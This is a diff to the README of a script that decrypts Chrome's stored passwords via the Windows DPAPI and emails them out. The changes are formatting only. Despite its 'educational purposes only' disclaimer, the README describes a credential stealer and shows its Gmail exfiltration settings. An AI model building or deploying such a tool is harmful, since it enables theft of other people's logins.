@@ -6,7 +6,7 @@ This project is strictly for **educational purposes only**. Any misuse—such as
 By using or modifying
 this script, you accept full responsibility for your actions. The creator of this guide and tool is not liable for any misuse, damage, or legal repercussions that may result.
 
-🔎 ** How This Script Works**
+🔎 **How This Script Works**
 This script interacts with Google Chrome's built-in password manager, which stores login credentials encrypted using the Windows Data Protection API (DPAPI).
 
 
@@ -23,7 +23,9 @@ pip install pycryptodomex
 Inside the script, configure:
 
 from_email = "YOUR_EMAIL@gmail.com"
+
 password = "APP_PASSWORD"  # Use Gmail App Password
+
 to_email = "RECEIVER_EMAIL@gmail.com"
 
 To generate a Gmail App Password:
